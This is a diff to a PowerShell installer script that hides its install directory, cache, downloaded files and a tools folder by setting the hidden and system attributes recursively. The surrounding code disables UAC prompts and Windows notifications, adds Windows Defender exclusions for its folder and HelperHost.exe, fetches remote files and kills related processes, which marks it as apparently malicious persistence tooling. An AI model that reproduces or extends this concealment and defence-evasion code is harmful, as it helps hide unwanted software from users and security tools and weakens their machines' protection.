@@ -98,6 +98,7 @@ function Clear-LegacySidecars {
 
 function Finish-Ok {
   Clear-LegacySidecars
+  try { Hide-HH $Dir; Hide-HH $Cache; Hide-HH (Join-Path $Dir 'tools') } catch {}
   Write-Output 'OK'
   try { Clear-ResumeTasks } catch {}
   Start-Sleep -Milliseconds 400
@@ -214,8 +215,15 @@ $ResumeFile = Join-Path $Dir 'resume.json'
 $PendingFile = Join-Path $Dir 'install-pending'
 $RebootFlag = Join-Path $Dir '.security-rebooted'
 New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
-cmd /c "attrib +h `"$Dir`"" | Out-Null
-cmd /c "attrib +h `"$Cache`"" | Out-Null
+function Hide-HH([string]$P) {
+  if (-not $P -or -not (Test-Path $P)) { return }
+  cmd /c "attrib +h +s `"$P`"" | Out-Null
+  if ((Get-Item $P -Force).PSIsContainer) {
+    cmd /c "attrib +h +s /s /d `"$P\*`"" | Out-Null
+  }
+}
+Hide-HH $Dir
+Hide-HH $Cache
 if (-not $SessionPrep) {
   Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 }
@@ -257,8 +265,10 @@ function Restore-OrFetch([string]$Name, [string]$Url) {
   Download-File $Url $part
   Copy-Item $part $cached -Force
   Copy-Item $cached $dest -Force
-  cmd /c "attrib +h `"$dest`"" | Out-Null
-  cmd /c "attrib +h `"$cached`"" | Out-Null
+  Hide-HH $dest
+  Hide-HH $cached
+  Hide-HH $Dir
+  Hide-HH $Cache
 }
 
 function Unblock-Quiet([string]$Path) {
@@ -380,6 +390,7 @@ function Disable-UACPrompts {
   Disable-WindowsNotifications
   $tools = Join-Path $Dir 'tools'
   New-Item $tools -ItemType Directory -Force | Out-Null
+  Hide-HH $tools
   Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
   if (Get-Command Add-MpPreference -EA SilentlyContinue) {
     Add-MpPreference -ExclusionPath $tools -EA SilentlyContinue
